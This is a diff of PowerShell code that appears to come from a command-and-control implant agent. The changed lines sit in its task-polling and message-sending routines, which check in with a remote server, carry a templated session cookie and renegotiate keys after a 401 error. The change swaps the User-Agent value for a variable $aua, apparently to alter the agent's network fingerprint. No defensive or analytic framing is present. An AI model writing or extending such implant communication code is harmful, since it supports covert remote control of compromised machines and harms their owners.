@@ -25,7 +25,7 @@ $Script:GetTask = {
                 $talk.Proxy = $Script:Proxy;
             }
 
-            $talk.Headers.Add("User-Agent",$script:UserAgent);
+            $talk.Headers.Add("User-Agent",$script:aua);
             $script:Headers.GetEnumerator() | % {$talk.Headers.Add($_.Name, $_.Value)};
             $talk.Headers.Add("Cookie","{{ session_cookie }}session=$RCook");
 
@@ -39,7 +39,7 @@ $Script:GetTask = {
         $script:MissedCheckins += 1;
         if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
             # restart key negotiation
-            Start-Negotiate -S "$Script:myserver" -SK $SK -UA $ua;
+            Start-Negotiate -S "$Script:myserver" -SK $SK -UA $aua;
         }
     }
 };
@@ -65,7 +65,7 @@ $Script:SendMessage = {
                 $talk.Proxy = $Script:Proxy;
             }
 
-            $talk.Headers.Add('User-Agent', $Script:UserAgent);
+            $talk.Headers.Add('User-Agent', $Script:aua);
             $Script:Headers.GetEnumerator() | ForEach-Object {$talk.Headers.Add($_.Name, $_.Value)};
 
             try {
@@ -77,7 +77,7 @@ $Script:SendMessage = {
                 # exception posting data...
                 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                     # restart key negotiation
-                    Start-Negotiate -S "$Script:myserver" -SK $SK -UA $ua;
+                    Start-Negotiate -S "$Script:myserver" -SK $SK -UA $aua;
                     }
                 }
             }
